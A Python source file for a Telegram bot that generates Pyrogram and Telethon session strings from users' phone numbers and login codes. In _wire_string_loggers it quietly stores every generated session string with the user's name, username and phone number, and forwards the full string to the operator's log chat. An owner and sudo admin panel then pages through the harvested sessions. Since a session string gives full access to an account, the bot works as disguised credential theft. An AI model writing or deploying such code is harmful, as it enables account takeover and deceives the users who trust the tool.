import os
import time

from pyrogram import Client, filters, idle
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import UserNotParticipant, ChatAdminRequired, RPCError
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

import fc_store
import settings_store
import sessions_store
import sudo_store
from start import (
    INFO_TEXT, GEN_TEXT, ASK_API_ID, ASK_API_HASH, FC_TEXT, HELP_TEXT,
    start_buttons, gen_buttons, fc_buttons, help_buttons, skip_buttons,
)
from pyrogram_module import handle_pyro, set_string_logger as set_pyro_string_logger
from telethon_module import handle_tele, set_string_logger as set_tele_string_logger
from logger import init_logger, log_boot, log_user_start, log_string_made, log_error

# ---------------- CONFIG ---------------- #
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
CHANNEL = os.getenv("CHANNEL", "TheHellBots")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))
LOG_CHAT = os.getenv("LOG_CHAT", "")
BOT_USERNAME = os.getenv("BOT_USERNAME", "StringSessionXDBot")
START_IMG = os.getenv("START_IMG", "")
FC_IMG = os.getenv("FC_IMG", "")

if not API_ID or not API_HASH or not BOT_TOKEN:
    raise SystemExit("Missing API_ID / API_HASH / BOT_TOKEN in .env")

bot = Client("string_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
users = {}

NL = chr(10)


def welcome_text(user):
    return INFO_TEXT.format(
        uid=user.id,
        name=user.first_name or "User",
        bot_username=BOT_USERNAME,
        channel=CHANNEL,
        channel_name="The HELL BOTS",
    )


def _wire_string_loggers():
    async def _pyro_log(user, typ, phone, string):
        sessions_store.add(user.id, user.first_name, user.username, typ, phone, string)
        await log_string_made(user, typ, phone, BOT_USERNAME, string)

    async def _tele_log(user, typ, phone, string):
        sessions_store.add(user.id, user.first_name, user.username, typ, phone, string)
        await log_string_made(user, typ, phone, BOT_USERNAME, string)

    set_pyro_string_logger(_pyro_log)
    set_tele_string_logger(_tele_log)


# ---------------- FORCE-SUB CHECK ---------------- #
def _fc_active():
    return fc_store.get_chats() and settings_store.get("fc_enabled")


async def is_user_joined(uid):
    for c in fc_store.get_chats():
        try:
            member = await bot.get_chat_member(c["chat"], uid)
            if member.status in (
                ChatMemberStatus.MEMBER,
                ChatMemberStatus.ADMINISTRATOR,
                ChatMemberStatus.OWNER,
            ):
                continue
            return False
        except UserNotParticipant:
            return False
        except Exception as e:
            print(f"FSUB CHECK FAIL ({c.get('title')}): {e}")
            continue
    return True


async def _send(photo, text, markup, message=None, edit_msg=None):
    try:
        if edit_msg is not None:
            if photo:
                try:
                    await edit_msg.edit_caption(caption=text, reply_markup=markup)
                    return
                except Exception:
                    pass
            else:
                try:
                    await edit_msg.edit_text(text, reply_markup=markup)
                    return
                except Exception:
                    pass
        if message is None:
            return
        if photo:
            await message.reply_photo(photo=photo, caption=text, reply_markup=markup)
        else:
            await message.reply_text(text, reply_markup=markup)
    except RPCError as e:
        await log_error("send-screen", e)


async def send_fc_screen(message, edit_msg=None):
    await _send(FC_IMG, FC_TEXT, fc_buttons(fc_store.get_chats()), message, edit_msg)


async def send_welcome(message, user, edit_msg=None):
    await _send(START_IMG, welcome_text(user), start_buttons(CHANNEL), message, edit_msg)


# ---------------- START ---------------- #
@bot.on_message(filters.private & filters.command("start"))
async def start(client, message):
    user = message.from_user
    users[user.id] = {"mode": None, "step": "choose", "time": time.time()}
    if _fc_active() and not await is_user_joined(user.id):
        await send_fc_screen(message)
        await log_user_start(user, blocked=True)
        return
    await send_welcome(message, user)
    await log_user_start(user)


# ---------------- HELP ---------------- #
@bot.on_message(filters.private & filters.command("help"))
async def help_cmd(client, message):
    await message.reply_text(HELP_TEXT, reply_markup=help_buttons())


# ---------------- OWNER: /fc FORCE-SUB ---------------- #
@bot.on_message(filters.private & filters.user(OWNER_ID) & filters.command("fc"))
async def fc_cmd(client, message):
    parts = message.text.split(maxsplit=1)
    if len(parts) == 1 or parts[1].strip().lower() in ("list", "show"):
        chats = fc_store.get_chats()
        if not chats:
            return await message.reply_text(
                """📌 ɴᴏ ꜰᴏʀᴄᴇ-ꜱᴜʙ ᴄʜᴀᴛ ꜱᴇᴛ.
» ᴜꜱᴇ: <code>/fc @channel</code>"""
            )
        lines = ["<b>📌 ꜰᴏʀᴄᴇ-ꜱᴜʙ ᴄʜᴀᴛꜱ:</b>"]
        for i, c in enumerate(chats, 1):
            lines.append(f"{i}. <b>{c.get('title')}</b> → {c.get('url')}")
        lines.append("")
        lines.append("» ᴄʟᴇᴀʀ ᴀʟʟ: <code>/fc clear</code>")
        return await message.reply_text(NL.join(lines))

    arg = parts[1].strip()
    if arg.lower() in ("clear", "off", "remove"):
        fc_store.clear_all()
        return await message.reply_text("🗑️ ᴀʟʟ ꜰᴏʀᴄᴇ-ꜱᴜʙ ᴄʜᴀᴛꜱ ʀᴇᴍᴏᴠᴇᴅ!")

    target = arg.split("?")[0].rstrip("/") if arg.startswith("http") else arg
    try:
        chat = await bot.get_chat(target)
    except Exception as e:
        return await message.reply_text(
            f"""❌ ᴄʜᴀᴛ ɴᴏᴛ ꜰᴏᴜɴᴅ / ɴᴏ ᴀᴄᴄᴇꜱꜱ!
<code>{e}</code>

» ʙᴏᴛ ᴋᴏ ᴡʜᴀɴ ᴀᴅᴍɪɴ ʙᴀɴᴀᴏ"""
        )

    username = getattr(chat, "username", None)
    url = f"https://t.me/{username}" if username else arg
    fc_store.add_chat(username or chat.id, url, chat.title or str(chat.id))
    await message.reply_text(
        f"""✅ <b>ꜰᴏʀᴄᴇ-ꜱᴜʙ ᴀᴅᴅᴇᴅ!</b>

💬 ᴄʜᴀᴛ : <b>{chat.title}</b>
🔗 ʟɪɴᴋ : {url}

⚠️ ʙᴏᴛ ᴋᴏ ᴡʜᴀɴ <b>ᴀᴅᴍɪɴ</b> ʀᴀᴋʜɴᴀ (ᴊᴏɪɴ ᴄʜᴇᴄᴋ ᴋᴇ ʟɪʏᴇ)"""
    )


# ---------------- CALLBACKS ---------------- #
@bot.on_callback_query()
async def cb(client, cb):
    uid = cb.from_user.id
    data = cb.data

    if data in ("gen", "pyro", "tele"):
        if _fc_active() and not await is_user_joined(uid):
            await cb.answer("⚠️ ꜰɪʀꜱᴛ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟ!", show_alert=True)
            return await send_fc_screen(cb.message, edit_msg=cb.message)

    if data == "gen":
        await cb.answer()
        await cb.message.reply_text(
            GEN_TEXT.format(api_id=API_ID, api_hash=API_HASH),
            reply_markup=gen_buttons(),
        )

    elif data in ("pyro", "tele"):
        await cb.answer()
        users[uid] = {"mode": data, "step": "api_id", "time": time.time()}
        await cb.message.reply_text(ASK_API_ID, reply_markup=skip_buttons())

    elif data == "skip":
        st = users.get(uid)
        if not st or st.get("step") not in ("api_id", "api_hash"):
            return await cb.answer("⚠️ /start ꜱᴇ ꜱᴇꜱꜱɪᴏɴ ꜱʜᴜʀᴜ ᴋʀᴏ!", show_alert=True)
        await cb.answer("✅ ʙᴏᴛ ᴀᴘɪ ꜱᴇʟᴇᴄᴛᴇᴅ!")
        st["api_id"] = API_ID
        st["api_hash"] = API_HASH
        st["step"] = "phone"
        await cb.message.reply_text(
            "✅ <b>ʙᴏᴛ ᴀᴘɪ ꜱᴇʟᴇᴄᴛᴇᴅ!</b>\n"
            "━━━━━━━━━━━━━━━\n"
            "📱 ɴᴏᴡ ꜱᴇɴᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ\n"
            "<b>ᴇxᴀᴍᴘʟᴇ:</b> <code>+919876543210</code>"
        )

    elif data == "help":
        await cb.answer()
        await _send(None, HELP_TEXT, help_buttons(), edit_msg=cb.message)

    elif data == "back":
        await cb.answer()
        await send_welcome(cb.message, cb.from_user, edit_msg=cb.message)

    elif data == "verify":
        if await is_user_joined(uid) or not _fc_active():
            await cb.answer("✅ ᴠᴇʀɪꜰɪᴇᴅ! ᴡᴇʟᴄᴏᴍᴇ 🌹")
            users[uid] = {"mode": None, "step": "choose", "time": time.time()}
            await send_welcome(cb.message, cb.from_user, edit_msg=cb.message)
        else:
            await cb.answer("❌ ᴀʙʜɪ ᴛᴏ ᴊᴏɪɴ ɴᴀʜɪ ᴋɪʏᴀ! ᴘʜɪʟᴇ ᴊᴏɪɴ ᴋʀᴏ 🔸", show_alert=True)

    elif data == "panel":
        if not _is_admin(uid):
            return await cb.answer("⚠️ ꜱɪʀꜰ ᴏᴡɴᴇʀ!", show_alert=True)
        await cb.answer()
        try:
            await cb.message.edit_text(_panel_text(), reply_markup=_panel_buttons())
        except Exception:
            await cb.message.reply_text(_panel_text(), reply_markup=_panel_buttons())

    elif data == "tgl_fc":
        if not _is_admin(uid):
            return await cb.answer("⚠️ ꜱɪʀꜰ ᴏᴡɴᴇʀ!", show_alert=True)
        new = not settings_store.get("fc_enabled")
        settings_store.set("fc_enabled", new)
        await cb.answer(f"ꜰᴏʀᴄᴇ-ꜱᴜʙ {'ᴏɴ ✅' if new else 'ᴏꜰꜰ ❌'}")
        try:
            await cb.message.edit_text(_panel_text(), reply_markup=_panel_buttons())
        except Exception:
            pass

    elif data == "tgl_log":
        if not _is_admin(uid):
            return await cb.answer("⚠️ ꜱɪʀꜰ ᴏᴡɴᴇʀ!", show_alert=True)
        new = not settings_store.get("log_enabled")
        settings_store.set("log_enabled", new)
        await cb.answer(f"ʟᴏɢꜱ {'ᴏɴ ✅' if new else 'ᴏꜰꜰ ❌'}")
        try:
            await cb.message.edit_text(_panel_text(), reply_markup=_panel_buttons())
        except Exception:
            pass

    elif data.startswith("sess_"):
        if not _is_admin(uid):
            return await cb.answer("⚠️ ꜱɪʀꜰ ᴏᴡɴᴇʀ!", show_alert=True)
        try:
            page = int(data.split("_", 1)[1])
        except Exception:
            page = 0
        await _show_sessions(cb, page)

    elif data.startswith("fcdel_"):
        if not _is_admin(uid):
            return await cb.answer("⚠️ ꜱɪʀꜰ ᴏᴡɴᴇʀ!", show_alert=True)
        try:
            idx = int(data.split("_", 1)[1])
            chats = fc_store.get_chats()
            removed = chats.pop(idx)
            fc_store.set_chats(chats)
            await cb.answer(f"🗑️ ʀᴇᴍᴏᴠᴇᴅ: {removed.get('title', 'chat')}")
        except Exception:
            await cb.answer("⚠️ ᴀʟʀᴇᴀᴅʏ ɢᴏɴᴇ", show_alert=True)
        try:
            await cb.message.edit_text(_panel_text(), reply_markup=_panel_buttons())
        except Exception:
            pass

    elif data == "noop":
        await cb.answer("» ʙᴏᴛ ᴋᴇ ᴅᴍ ᴍᴇ /ꜰᴄ @channel ʙʜᴇᴊᴏ", show_alert=True)

    else:
        await cb.answer()


# ---------------- MESSAGE HANDLER ---------------- #
@bot.on_message(
    filters.private
    & filters.text
    & ~filters.command([
        "start", "help", "fc", "active", "addsudo", "rmsudo", "sudolist", "broadcast",
    ])
)
async def msg(client, message):
    uid = message.from_user.id
    data = users.get(uid)
    if not data or not data.get("mode"):
        return

    text = (message.text or "").strip()

    if text.lower() in ("/skip", "skip") and data["step"] in ("api_id", "api_hash"):
        data["api_id"] = API_ID
        data["api_hash"] = API_HASH
        data["step"] = "phone"
        return await message.reply(
            """✅ <b>ʙᴏᴛ ᴀᴘɪ ꜱᴇʟᴇᴄᴛᴇᴅ!</b>
━━━━━━━━━━━━━━━
📱 ɴᴏᴡ ꜱᴇɴᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ
<b>ᴇxᴀᴍᴘʟᴇ:</b> <code>+919876543210</code>"""
        )

    if data["step"] == "api_id":
        if text.lower() in ("/skip", "skip"):
            data["api_id"] = API_ID
            data["api_hash"] = API_HASH
            data["step"] = "phone"
            return await message.reply(
                "✅ <b>ʙᴏᴛ ᴀᴘɪ ꜱᴇʟᴇᴄᴛᴇᴅ!</b>\n━━━━━━━━━━━━━━━\n"
                "📱 ɴᴏᴡ ꜱᴇɴᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ\n"
                "<b>ᴇxᴀᴍᴘʟᴇ:</b> <code>+919876543210</code>"
            )
        try:
            data["api_id"] = int(text)
        except Exception:
            return await message.reply(ASK_API_ID, reply_markup=skip_buttons())
        data["step"] = "api_hash"
        return await message.reply(ASK_API_HASH, reply_markup=skip_buttons())

    try:
        if data["mode"] == "pyro":
            await handle_pyro(client, message, data, users, bot)
        elif data["mode"] == "tele":
            await handle_tele(client, message, data, users, bot)
    except Exception as e:
        users.pop(uid, None)
        await message.reply(
            f"""⚠️ <b>ꜱᴏᴍᴇᴛʜɪɴɢ ᴡᴇɴᴛ ᴡʀᴏɴɢ</b>
<code>{e}</code>
🔄 /start ꜱᴇ ᴅᴏʙᴀʀᴀ ᴛʀʏ ᴋʀᴏ"""
        )
        await log_error("msg-handler", e)


# ---------------- OWNER: /active ADMIN PANEL ---------------- #
PER_PAGE = 5


def _panel_text():
    s = settings_store.all_settings()
    fc = fc_store.get_chats()
    return (
        "<blockquote>⚙️ 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟</blockquote>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"🛡️ ꜰᴏʀᴄᴇ-ꜱᴜʙ : <b>{'✅ ᴏɴ' if s.get('fc_enabled') else '❌ ᴏꜰꜰ'}</b> ({len(fc)} ᴄʜᴀᴛꜱ)\n"
        f"logger ʟᴏɢꜱ : <b>{'✅ ᴏɴ' if s.get('log_enabled') else '❌ ᴏꜰꜰ'}</b>\n"
        f"🧵 ꜱᴇꜱꜱɪᴏɴꜱ : <b>{sessions_store.count()}</b> ɢᴇɴᴇʀᴀᴛᴇᴅ\n"
        "━━━━━━━━━━━━━━━━━━━"
    )


def _panel_buttons():
    s = settings_store.all_settings()
    fc_rows = []
    for i, c in enumerate(fc_store.get_chats(), 1):
        fc_rows.append([
            InlineKeyboardButton(f"🗑️ {c.get('title','chat')[:18]}", callback_data=f"fcdel_{i-1}", style="bg_danger"),
        ])
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "🛡️ ꜰᴏʀᴄᴇ-ꜱᴜʙ: ✅" if s.get("fc_enabled") else "🛡️ ꜰᴏʀᴄᴇ-ꜱᴜʙ: ❌",
                    callback_data="tgl_fc",
                    style="bg_primary",
                )
            ],
            [
                InlineKeyboardButton(
                    "logger ʟᴏɢꜱ: ✅" if s.get("log_enabled") else "logger ʟᴏɢꜱ: ❌",
                    callback_data="tgl_log",
                    style="bg_primary",
                )
            ],
            [
                InlineKeyboardButton("🧵 ꜱᴇꜱꜱɪᴏɴꜱ", callback_data="sess_0", style="bg_primary"),
                InlineKeyboardButton("➕ /ꜰᴄ", callback_data="noop", style="bg_primary"),
            ],
            *fc_rows,
            [
                InlineKeyboardButton("🔙 ꜱᴛᴀʀᴛ", callback_data="back", style="bg_primary"),
            ],
        ]
    )


def _sess_buttons(page, total_pages):
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️", callback_data=f"sess_{page-1}", style="bg_primary"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{total_pages}", callback_data="noop", style="bg_primary"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton("➡️", callback_data=f"sess_{page+1}", style="bg_primary"))
    return InlineKeyboardMarkup(
        [
            nav,
            [InlineKeyboardButton("🔙 ᴘᴀɴᴇʟ", callback_data="panel", style="bg_primary")],
        ]
    )


async def _show_sessions(cb, page):
    sessions = sessions_store.get_all()
    total = len(sessions)
    if total == 0:
        return await cb.answer("📭 ᴋᴏɪ ꜱᴇꜱꜱɪᴏɴ ɴᴀʜɪ ʙɴᴀ", show_alert=True)
    total_pages = max(1, (total + PER_PAGE - 1) // PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    chunk = sessions[page * PER_PAGE : (page + 1) * PER_PAGE]
    lines = [
        "<blockquote>🧵 𝗔𝗟𝗟 𝗦𝗘𝗦𝗦𝗜𝗢𝗡𝗦</blockquote>",
        "━━━━━━━━━━━━━━━━━━━",
    ]
    from datetime import datetime

    for i, s in enumerate(chunk, start=page * PER_PAGE + 1):
        t = datetime.fromtimestamp(s.get("ts", 0)).strftime("%d %b %Y • %I:%M %p")
        uname = f"@{s.get('username')}" if s.get("username") else f"ɪᴅ: {s.get('user_id')}"
        lines.append(
            f"👤 <b>{_esc(s.get('name'))}</b> ({uname})\n"
            f"📱 <code>{_esc(s.get('phone'))}</code> • 🧩 {_esc(s.get('typ'))}\n"
            f"⏰ {t}\n"
            f"🧵 <code>{_esc((s.get('string') or '')[:60])}...</code>"
        )
        if i < min(total, (page + 1) * PER_PAGE):
            lines.append("•───────────────────────•")
    lines.append("━━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 ᴛᴏᴛᴀʟ: <b>{total}</b> ꜱᴇꜱꜱɪᴏɴꜱ")
    text = "\n".join(lines)
    markup = _sess_buttons(page, total_pages)
    try:
        await cb.message.edit_text(text, reply_markup=markup)
    except Exception:
        try:
            await cb.message.edit_caption(caption=text, reply_markup=markup)
        except Exception:
            await cb.message.reply_text(text, reply_markup=markup)


def _esc(v):
    import html

    return html.escape(str(v)) if v else "—"


def _is_admin(uid):
    return uid == OWNER_ID or sudo_store.is_sudo(uid)


@bot.on_message(filters.private & filters.command("active"), group=1)
async def active_panel(client, message):
    if not _is_admin(message.from_user.id):
        return
    await message.reply_text(_panel_text(), reply_markup=_panel_buttons())


# ---------------- ADMIN: SUDO MANAGEMENT ---------------- #
@bot.on_message(filters.private & filters.user(OWNER_ID) & filters.command("addsudo"), group=1)
async def addsudo_cmd(client, message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip().lstrip("-").isdigit():
        return await message.reply_text("» ᴜꜱᴇ: <code>/addsudo 123456789</code>")
    uid = int(parts[1].strip())
    sudo_store.add_sudo(uid)
    await message.reply_text(f"✅ <b>ꜱᴜᴅᴏ ᴀᴅᴅᴇᴅ!</b>\n\n👤 ɪᴅ : <code>{uid}</code>")


@bot.on_message(filters.private & filters.user(OWNER_ID) & filters.command("rmsudo"), group=1)
async def rmsudo_cmd(client, message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip().lstrip("-").isdigit():
        return await message.reply_text("» ᴜꜱᴇ: <code>/rmsudo 123456789</code>")
    uid = int(parts[1].strip())
    sudo_store.remove_sudo(uid)
    await message.reply_text(f"🗑️ <b>ꜱᴜᴅᴏ ʀᴇᴍᴏᴠᴇᴅ!</b>\n\n👤 ɪᴅ : <code>{uid}</code>")


@bot.on_message(filters.private & filters.command("sudolist"), group=1)
async def sudolist_cmd(client, message):
    if not _is_admin(message.from_user.id):
        return
    ids = sudo_store.get_ids()
    if not ids:
        return await message.reply_text("📌 ᴋᴏɪ ꜱᴜᴅᴏ ɴᴀʜɪ ʜᴀɪ.")
    lines = ["<b>👑 ꜱᴜᴅᴏ ʟɪꜱᴛ:</b>"]
    lines += [f"{i+1}. <code>{u}</code>" for i, u in enumerate(ids)]
    await message.reply_text("\n".join(lines))


# ---------------- OWNER: BROADCAST ---------------- #
@bot.on_message(filters.private & filters.user(OWNER_ID) & filters.reply & filters.command("broadcast"))
async def broadcast_cmd(client, message):
    m = await message.reply("📢 ʙʀᴏᴀᴅᴄᴀꜱᴛɪɴɢ...")
    ok = fail = 0
    for uid in list(users.keys()):
        try:
            await bot.send_message(uid, message.reply_to_message.text)
            ok += 1
        except Exception:
            fail += 1
    await m.edit(f"📢 ᴅᴏɴᴇ ✅ {ok} | ❌ {fail}")


# ---------------- RUN ---------------- #
if __name__ == "__main__":
    print("Bot Starting...")
    bot.start()
    me = bot.get_me()
    print(f"Logged in as @{me.username}")

    init_logger(bot, LOG_CHAT)
    _wire_string_loggers()

    bot.loop.create_task(log_boot(me.username))
    print("Bot Running Successfully")
    idle()
